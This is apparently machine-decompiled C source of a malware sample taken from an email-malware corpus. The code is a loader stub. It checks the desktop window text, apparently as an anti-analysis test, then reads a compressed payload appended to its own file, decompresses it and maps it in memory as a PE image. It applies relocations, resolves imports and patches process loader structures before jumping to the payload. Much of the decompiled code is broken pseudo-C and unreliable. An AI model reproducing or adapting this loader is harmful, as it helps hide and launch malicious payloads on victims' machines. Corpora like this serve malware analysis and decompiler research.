// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0586/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401000(Eq_616 * dwArg04, Eq_616 * dwArg08, Eq_144 dwArg0C)
{
	int32 dwLoc08_15 = 0x00000000;
	while (dwLoc08_15 < dwArg0C)
	{
		dwArg04[dwLoc08_15] = dwArg08[dwLoc08_15];
		dwLoc08_15 = dwLoc08_15 + 0x00000001;
	}
	return;
}

word32 * fn00401040(word32 * ebp, word32 dwArg04, Eq_142 dwArg08, Eq_409 dwArg0C)
{
	if (dwArg0C <u 0x00000001)
		;
	else
	{
		byte cl_48 = *dwArg04;
		up32 dwLoc0C_115 = 0x00000001;
		word32 dwLoc18_111 = 0x00000000;
		do
		{
			up32 ecx_66 = dwLoc0C_115 + 0x00000001;
			byte al_63 = dwArg04[dwLoc0C_115];
			dwLoc0C_115 = ecx_66;
			if ((word32) al_63 != (word32) cl_48)
			{
				dwArg08[dwLoc18_111] = al_63;
				dwLoc18_111 = dwLoc18_111 + 0x00000001;
			}
			else if ((word32) dwArg04[ecx_66] == 0x00000000)
			{
				dwArg08[dwLoc18_111] = cl_48;
				dwLoc18_111 = dwLoc18_111 + 0x00000001;
				dwLoc0C_115 = ecx_66 + 0x00000001;
			}
			else
			{
				word32 eax_126 = fn00401150(fp - 0x00000010, dwArg04 + ecx_66) + ecx_66;
				dwLoc0C_115 = fn00401150(fp - 0x00000024, dwArg04 + eax_126) + eax_126;
				up32 dwLoc1C_141 = 0x00000000;
				while (dwLoc1C_141 <u dwLoc10)
				{
					dwArg08[dwLoc18_111] = dwArg08[dwLoc18_111 - dwLoc24];
					dwLoc18_111 = dwLoc18_111 + 0x00000001;
					dwLoc1C_141 = dwLoc1C_141 + 0x00000001;
				}
			}
		} while (dwLoc0C_115 <u dwArg0C);
	}
}

word32 fn00401150(word32 dwArg04, word32 dwArg08)
{
	word32 dwLoc08_12 = 0x00000000;
	word32 dwLoc14_13 = 0x00000000;
	do
	{
		word32 ecx_16 = (word32) dwArg08->b0000;
		word32 eax_25 = dwLoc08_12 << 0x00000007 | ecx_16 & 0x0000007F;
		word32 edx_28 = dwLoc14_13 + 0x00000001;
		dwArg08 = dwArg08 + 1;
		dwLoc08_12 = eax_25;
		dwLoc14_13 = edx_28;
	} while ((ecx_16 & 0x00000080) != 0x00000000);
	*dwArg04 = eax_25;
	return edx_28;
}

word32 fn004011B0(word32 dwArg04)
{
	word32 eax_28;
	word32 eax_23 = CreateFileA(dwArg04, 0x80000000, 0x00000001, 0x00000000, 0x00000003, 0x00000080, 0x00000000);
	if (eax_23 == 0xFFFFFFFF)
		eax_28 = 0x00000000;
	else
		eax_28 = eax_23;
	return eax_28;
}

void fn004011F0(word32 ebx, word32 ebp, word32 esi, word32 edi, Eq_499 * fs, word32 dwArg04, word32 dwArg08)
{
	GetModuleHandleA(0x00000000);
	LoadIconA(GetModuleHandleA(0x00000000), 0x00403000);
	LoadCursorA(0x00000000, 0x00007F00);
	word16 ax_51 = (word16) RegisterClassA(fp - 0x00000060);
	if ((word32) ax_51 == 0x00000000)
	{
l004015BD:
		return;
	}
	else
	{
		if (dwArg08 != 0x00000001)
			globals->dw403050 = 0x00000000;
		else
		{
			globals->dw403050 = 0x00000001;
			globals->t403040 = dwArg04;
		}
		Eq_144 dwLoc20_218;
		uint8 cl_182 = (byte) (dwLoc10 + 0x000F7061);
		globals->dw403060 = dwLoc10 - globals->dw403038 - 0x0006CAAB << 0x00000033 >> cl_182;
		Mem188[fp - 0x00000084:word32] = 0x00000000;
		Mem192[fp - 0x00000084:word32] = GetModuleHandleA(0x00000000);
		CreateWindowExA(0x00000000, 0x00403020, 0x00403018, 0x00000001, 0x00011779, 0x00024256, 0x05536774, 0x00044318, 0x00000000, 0x00000000, null, 0x00000000);
		if (globals->dw403050 == 0x00000000)
		{
			&*fp->tFFFFFF80.u0 = 0x00000000;
			dwLoc20_218 = GetModuleHandleA(0x00000000);
		}
		else
			dwLoc20_218 = dwArg04;
		word32 eax_223 = dwLoc20_218 + Mem192[dwLoc20_218 + 0x0000003C:word32];
		Eq_253 * eax_234 = ((word32) eax_223->w0006 - 0x00000001) *s 0x00000028 + (&eax_223->w0014 + (word32) eax_223->w0014);
		word32 eax_240 = eax_234->dw0010 - 0x00000001 + eax_223->t003C;
		Eq_280 eax_250 = SEQ(SEQ(0x00000000, eax_240) % eax_223->t003C, eax_240) /u eax_223->t003C *s eax_223->t003C + eax_234->dw0014;
		&*fp->tFFFFFF80.u0 = 0x00000200;
		Eq_142 eax_255 = fn00401D40(0x00000000);
		if (eax_255 == 0x00000000)
			goto l004015BD;
		else
		{
			&*fp->tFFFFFF80.u0 = 0x00000200;
			Mem270[fp - 0x00000088:word32] = dwLoc20_218;
			GetModuleFileNameA(0x00000000, eax_255, (Eq_1405 *) 0x00000200);
			fp->tFFFFFF80 = eax_255;
			Eq_142 eax_276 = fn004011B0(0x00000000);
			if (eax_276 == 0x00000000)
				goto l004015BD;
			else
			{
				Eq_337 eax_291 = GetFileSize(eax_276, 0x00000000) - eax_250;
				if (eax_291 == 0x00000000)
					goto l004015BD;
				else
				{
					Mem302[fp - 0x00000080:word32] = eax_291 + 0x00000010;
					Eq_142 eax_303 = fn00401D40(0x00000000);
					if (eax_303 == 0x00000000)
						goto l004015BD;
					else
					{
						fp->tFFFFFF80 = eax_276;
						SetFilePointer(0x00000000, eax_250, 0x00000000, 0x00000000);
						fp->tFFFFFF80 = eax_303;
						fp->tFFFFFF80 = eax_276;
						if (ReadFile(0x00044318, 0x00000000, eax_291, fp - 0x00000028, 0x00000000) == 0x00000000)
							goto l004015BD;
						else
						{
							fp->tFFFFFF80 = eax_276;
							CloseHandle(0x00000000);
							if (dwLoc28 != eax_291)
								goto l004015BD;
							else
							{
								Eq_401 eax_357 = GetDesktopWindow();
								Eq_142 eax_361 = fn00401D40(0x000000C8);
								Mem365[eax_361 + 0x00000000:byte] = 0x01;
								GetWindowTextA(eax_357, eax_361, 0x000000C8);
								if ((word32) Mem365[eax_361 + 0x00000000:byte] == 0x00000000)
								{
									fp->tFFFFFF80 = eax_361;
									fn00401D10(0x000000C8);
									memcpy(eax_303, eax_303 - 0x00000040 + eax_291, 0x00000040);
									word32 eax_400 = Mem383[eax_303 + 0x00000000:word32];
									Mem410[0x0040304C:word32] = fn00401D40(Mem383[eax_303 + 0x00000004:word32]);
									if (globals->t40304C == 0x00000000)
										ExitProcess(0x00000351);
									word32 esp_444;
									word32 ebp_424 = fn00401040(fp - 0x00000004, eax_303 + 0x00000008, Mem410[0x0040304C:word32], eax_400);
									globals->dw40303C = edi;
									globals->dw403034 = esi;
									globals->dw403048 = ebx;
									globals->ptr403044 = ebp_424;
									&*fp->tFFFFFF80.u0 = 0x00401571;
									ebp_424->tFFFFFFF8 = fp->tFFFFFF80;
									globals->ptr403058 = fs->ptr0018;
									if (globals->dw403050 != 0x00000000)
									{
										fp->tFFFFFF80 = ebp_424->tFFFFFFF8 - globals->t403040;
										fn004015D0(dwArg00);
										esp_444 = fp - 0x0000007C;
									}
									else
									{
										&*fp->tFFFFFF80.u0 = 0x00000000;
										fp->tFFFFFF80 = ebp_424->tFFFFFFF8 - GetModuleHandleA(fp->tFFFFFF80);
										fn004015D0(dwArg00);
										esp_444 = fp - 0x0000007C;
									}
									Eq_142 * esp_446 = esp_444 - 0x00000004;
									Mem447[esp_446 + 0x00000000:word32] = Mem438[0x0040304C:word32];
									word32 eax_449 = fn00401740(dwArg00);
									if (eax_449 == 0x00000000)
									{
										Mem462[esp_446 + 0x00000000:word32] = Mem447[0x0040304C:word32];
										fn00401D10(dwArg00);
										Mem466[esp_446 + 0x00000000:word32] = 0x00006188;
										ExitProcess(Mem466[esp_446 + 0x00000000:UINT]);
									}
									Mem447[0x0040305C:word32]();
									return;
								}
								else
								{
									fp->tFFFFFF80 = eax_361;
									fn00401D10(0x000000C8);
									goto l004015BD;
								}
							}
						}
					}
				}
			}
		}
	}
}

void fn004015D0(word32 dwArg04)
{
fn004015D0_entry:
l004015D0:
	Eq_144 dwLoc24_13
	branch globals->dw403050 == 0x00000000 l004015EA
l004015E0:
	dwLoc24_13 = globals->t403040;
	goto l004015F5
l004015EA:
	&*dwLoc2C.u0 = 0x00000000;
	dwLoc24_13 = GetModuleHandleA(0x00000000);
l004015F5:
	branch dwLoc24_13 != 0x00000000 l00401602
l004015FB:
	goto l00401730
l00401602:
	word32 edx_45 = dwLoc24_13 + Mem0[dwLoc24_13 + 0x0000003C:word32]
	fp->tFFFFFFD4.u0 = 0x00000040;
	globals->ptr403054 = VirtualAlloc(0x00000000, edx_45->t0050, 0x00003000, null);
	branch globals->ptr403054 != null l00401639
l00401632:
	goto l00401730
l00401639:
	fp->tFFFFFFD4 = edx_45->t0050;
	Mem71[fp - 0x00000030:word32] = dwLoc24_13
	fn00401000(globals->ptr403054, (Eq_616 *) 0x00003000, dwLoc2C)
	word32 eax_77 = globals->ptr403054 - dwLoc24_13
	branch edx_45->dw00A4 == 0x00000000 l0040171E
l0040166E:
	Eq_650 * dwLoc0C_108 = dwLoc24_13 + Mem71[edx_45 + 0x000000A0:word32]
l0040167D:
	branch dwLoc0C_108->dw0004 == 0x00000000 l0040171E
l0040168A:
	uint32 eax_123 = dwLoc0C_108->dw0004 - 0x00000008 >>u 0x00000001
	word16 * ecx_126[] = &dwLoc0C_108->a0008[0]
	uint32 dwLoc08_129 = 0x00000000
	goto l004016B3
l004016AA:
	dwLoc08_129 = dwLoc08_129 + 0x00000001;
l004016B3:
	branch dwLoc08_129 >=u eax_123 l0040170D
l004016BB:
	branch (word32) ecx_126[dwLoc08_129] >> 0x0000000C != 0x00000003 l0040170B
l004016CD:
	(Mem71[0x00403054:word32] + Mem71[dwLoc0C_108 + 0x00000000:word32])[(word32) ecx_126[dwLoc08_129] & 0x00000FFF] = (Mem71[0x00403054:word32] + Mem71[dwLoc0C_108 + 0x00000000:word32])[(word32) ecx_126[dwLoc08_129] & 0x00000FFF] + eax_77;
l0040170B:
	goto l004016AA
l0040170D:
	dwLoc0C_108 = dwLoc0C_108 + Mem71[dwLoc0C_108 + 0x00000004:word32];
	goto l0040167D
l0040171E:
l00401730:
	return
fn004015D0_exit:
}

word32 fn00401740(word32 dwArg04)
{
	word32 eax_249;
	word32 edx_16 = dwArg04 + Mem0[dwArg04 + 0x0000003C:word32];
	Eq_725 * dwLoc24_109 = &edx_16->w0014 + (word32) edx_16->w0014;
	Eq_616 * eax_33 = VirtualAlloc(0x00000000, edx_16->t0050, 0x00003000, 0x00000040);
	if (eax_33 == null)
		eax_249 = 0x00000000;
	else
	{
		Mem94[fp - 0x0000004C:word32] = Mem0[dwArg04 + 0x0000003C:word32] + 0x00000138 + (word32) Mem0[edx_16 + 0x00000006:word16] *s 0x00000028;
		Mem97[fp - 0x00000050:word32] = dwArg04;
		fn00401000(eax_33, (Eq_616 *) 0x00003000, 0x00000040);
		up32 dwLoc0C_103 = 0x00000000;
		while (dwLoc0C_103 <u (word32) edx_16->w0006)
		{
			if (dwLoc24_109->dw0014 != 0x00000000 && dwLoc24_109->dw0010 != 0x00000000)
			{
				word32 eax_144 = dwLoc24_109->dw0010 - 0x00000001 + edx_16->t003C;
				fn00401000(eax_33 + Mem97[dwLoc24_109 + 0x0000000C:word32], dwArg04 + Mem97[dwLoc24_109 + 0x00000014:word32], SEQ(SEQ(0x00000000, eax_144) % edx_16->t003C, eax_144) /u edx_16->t003C *s edx_16->t003C);
			}
			dwLoc24_109 = dwLoc24_109 + 1;
			dwLoc0C_103 = dwLoc0C_103 + 0x00000001;
		}
		Eq_775 * ecx_172 = eax_33 + Mem97[eax_33 + 0x0000003C:word32];
		Eq_780 * dwLoc44_178 = eax_33 + Mem97[ecx_172 + 0x00000080:word32];
		while (dwLoc44_178->dw0010 != 0x00000000)
		{
			Eq_144 eax_200 = GetModuleHandleA(eax_33 + Mem97[dwLoc44_178 + 0x0000000C:word32]);
			Eq_144 dwLoc14_202 = eax_200;
			if (eax_200 == 0x00000000)
			{
				if (globals->dw403050 != 0x00000000)
				{
					eax_249 = 0x00000000;
					goto l00401C5F;
				}
				Eq_144 eax_327 = LoadLibraryA(eax_33 + Mem97[dwLoc44_178 + 0x0000000C:word32]);
				dwLoc14_202 = eax_327;
				if (eax_327 == 0x00000000)
				{
					eax_249 = 0x00000000;
					goto l00401C5F;
				}
				goto l004018A8;
			}
l004018A8:
			Eq_846 * dwLoc30_214;
			Eq_847 * dwLoc20_213;
			if (dwLoc44_178->dw0000 != 0x00000000)
			{
				dwLoc20_213 = eax_33 + Mem97[dwLoc44_178 + 0x00000000:word32];
				dwLoc30_214 = eax_33 + Mem97[dwLoc44_178 + 0x00000010:word32];
			}
			else
			{
				dwLoc20_213 = eax_33 + Mem97[dwLoc44_178 + 0x00000010:word32];
				dwLoc30_214 = eax_33 + Mem97[dwLoc44_178 + 0x00000000:word32];
			}
			if (dwLoc44_178->dw0010 != 0x00000000 && dwLoc44_178->dw0000 != 0x00000000)
			{
				fp->dwFFFFFFF0 = 0x00000001;
				goto l004018FF;
			}
l004018FF:
			while (dwLoc20_213->dw0000 != 0x00000000)
			{
				if ((dwLoc20_213->dw0000 & 0x80000000) != 0x00000000)
					dwLoc20_213->dw0000 = GetProcAddress(dwLoc14_202, dwLoc20_213->dw0000 & 0x7FFFFFFF);
				else
					dwLoc20_213->dw0000 = GetProcAddress(dwLoc14_202, dwLoc20_213->dw0000 + 0x00000002 + eax_33);
				if (dwLoc20_213->dw0000 == 0x00000000)
				{
					eax_249 = 0x00000000;
					goto l00401C5F;
				}
				if (0x00000000 != 0x00000000)
					dwLoc30_214->dw0000 = dwLoc20_213->dw0000;
				dwLoc20_213 = dwLoc20_213 + 1;
				dwLoc30_214 = dwLoc30_214 + 1;
			}
			dwLoc44_178 = dwLoc44_178 + 1;
		}
		if (globals->dw403050 != 0x00000000)
		{
			word32 edx_618 = globals->t403040 - ecx_172->t0034;
			if (ecx_172->dw00A4 != 0x00000000)
			{
				Eq_928 * dwLoc18_627 = eax_33 + Mem97[ecx_172 + 0x000000A0:word32];
				while (dwLoc18_627->dw0004 != 0x00000000)
				{
					uint32 edx_642 = dwLoc18_627->dw0004 - 0x00000008 >>u 0x00000001;
					word16 * eax_645[] = &dwLoc18_627->a0008[0];
					uint32 dwLoc0C_648 = 0x00000000;
					while (dwLoc0C_648 <u edx_642)
					{
						if ((word32) eax_645[dwLoc0C_648] >> 0x0000000C == 0x00000003)
							(eax_33 + Mem97[dwLoc18_627 + 0x00000000:word32])[(word32) eax_645[dwLoc0C_648] & 0x00000FFF] = (eax_33 + Mem97[dwLoc18_627 + 0x00000000:word32])[(word32) eax_645[dwLoc0C_648] & 0x00000FFF] + edx_618;
						dwLoc0C_648 = dwLoc0C_648 + 0x00000001;
					}
					dwLoc18_627 = dwLoc18_627 + Mem97[dwLoc18_627 + 0x00000004:word32];
				}
			}
		}
		Eq_144 eax_353 = ecx_172->t0050;
		fp->dwFFFFFFF0 = 0x00000004;
		Eq_899 eax_364 = CreateFileMappingA(0xFFFFFFFF, 0x00000000, 0x00000000, 0x00000000, eax_353, 0x00000000);
		if (eax_364 == 0x00000000)
			eax_249 = 0x00000000;
		else
		{
			if (globals->dw403050 != 0x00000000)
			{
				Mem583[fp - 0x0000004C:word32] = Mem359[0x00403040:word32];
				fp->dwFFFFFFF0 = 0x00000000;
				fp->dwFFFFFFF0 = 0x00000000;
				fp->dwFFFFFFF0 = 0x00000022;
				fp->dwFFFFFFF0 = eax_364.u0;
				globals->ptr403054 = MapViewOfFileEx(0xFFFFFFFF, 0x00000000, (Eq_1407 *) 0x00000004, 0x00000000, 0x00000000, null);
			}
			else
			{
				Mem601[fp - 0x0000004C:word32] = Mem359[ecx_172 + 0x00000034:word32];
				fp->dwFFFFFFF0 = 0x00000000;
				fp->dwFFFFFFF0 = 0x00000000;
				fp->dwFFFFFFF0 = 0x00000022;
				fp->dwFFFFFFF0 = eax_364.u0;
				globals->ptr403054 = MapViewOfFileEx(0xFFFFFFFF, 0x00000000, (Eq_1407 *) 0x00000004, 0x00000000, 0x00000000, 0x00000000);
			}
			if (globals->ptr403054 != null)
				goto l00401BF0;
			else if (globals->dw403050 == 0x00000000)
				if (UnmapViewOfFile(ecx_172->t0034) == 0x00000000)
				{
					fp->dwFFFFFFF0 = 0x00000000;
					Mem571[fp - 0x00000054:word32] = Mem567[ecx_172 + 0x00000034:word32];
					if (VirtualFree(null, 0x00000000, 0x00008000) == 0x00000000)
						eax_249 = 0x00000000;
					else
						goto l00401B49;
				}
				else
					goto l00401B49;
			else if (UnmapViewOfFile(globals->t403040) == 0x00000000)
			{
				fp->dwFFFFFFF0 = 0x00000000;
				Mem545[fp - 0x00000054:word32] = Mem542[0x00403040:word32];
				if (VirtualFree(null, 0x00000000, 0x00008000) == 0x00000000)
					eax_249 = 0x00000000;
				else
				{
l00401B17:
l00401B49:
					if (globals->dw403050 != 0x00000000)
					{
						Eq_144 eax_489 = globals->t403040;
						fp->dwFFFFFFF0 = 0x00000000;
						fp->dwFFFFFFF0 = 0x00000000;
						fp->dwFFFFFFF0 = 0x00000022;
						globals->ptr403054 = MapViewOfFileEx(eax_364, 0x00000022, null, 0x00000000, 0x00000000, eax_489);
					}
					else
					{
						Eq_144 eax_507 = ecx_172->t0034;
						fp->dwFFFFFFF0 = 0x00000000;
						fp->dwFFFFFFF0 = 0x00000000;
						fp->dwFFFFFFF0 = 0x00000022;
						globals->ptr403054 = MapViewOfFileEx(eax_364, 0x00000022, null, 0x00000000, 0x00000000, eax_507);
					}
					if (globals->ptr403054 != null)
						goto l00401BF0;
					else
					{
						if (globals->dw403050 != 0x00000000)
						{
							fp->dwFFFFFFF0 = 0x00003000;
							Mem467[fp - 0x00000054:word32] = Mem463[ecx_172 + 0x00000050:word32];
							Mem470[fp - 0x00000058:word32] = Mem467[0x00403040:word32];
							globals->ptr403054 = VirtualAlloc(null, 0x00000000, null, 0x00000040);
						}
						else
						{
							fp->dwFFFFFFF0 = 0x00003000;
							Mem481[fp - 0x00000054:word32] = Mem477[ecx_172 + 0x00000050:word32];
							Mem485[fp - 0x00000058:word32] = Mem481[ecx_172 + 0x00000034:word32];
							globals->ptr403054 = VirtualAlloc(null, 0x00000000, null, 0x00000040);
						}
						if (globals->ptr403054 == null)
							eax_249 = 0x00000000;
						else
						{
l00401BF0:
							fn00401000(globals->ptr403054, eax_33, ecx_172->t0050);
							if (globals->dw403050 != 0x00000000)
								fn00401C70(globals->t403040, Mem359[0x00403054:word32] + Mem359[ecx_172 + 0x00000028:word32]);
							else
								fn00401CE0(globals->ptr403054);
							Mem405[0x0040305C:word32] = Mem359[0x00403054:word32] + Mem359[ecx_172 + 0x00000028:word32];
							ecx_172->ptr0028 = globals->ptr40305C;
							eax_249 = 0x00000001;
						}
					}
				}
			}
			else
				goto l00401B17;
		}
	}
l00401C5F:
	return eax_249;
}

void fn00401C70(Eq_144 dwArg04, word32 dwArg08)
{
	Eq_1334 * ecx_14 = globals->ptr403058->ptr0030->ptr000C->ptr000C;
	Eq_1334 * dwLoc10_15 = ecx_14;
	while (0x00000001 != 0x00000000)
	{
		if (dwLoc10_15 == null)
			goto l00401CDC;
		if (dwLoc10_15->dw0018 == dwArg04)
		{
			dwLoc10_15->dw001C = dwArg08;
			goto l00401CDC;
		}
		Eq_1334 * eax_53 = dwLoc10_15->ptr0000;
		dwLoc10_15 = eax_53;
		if (eax_53 == ecx_14)
			goto l00401CDC;
	}
l00401CDC:
	return;
}

void fn00401CE0(Eq_616 * dwArg04)
{
	Eq_501 * ecx_10 = globals->ptr403058;
	ecx_10->ptr0030->dw0008 = dwArg04;
	return;
}

void fn00401D10(word32 dwArg04)
{
	HeapFree(GetProcessHeap(), 0x00000000, dwArg04);
	return;
}

word32 fn00401D40(word32 dwArg04)
{
	return HeapAlloc(GetProcessHeap(), 0x00000000, dwArg04);
}

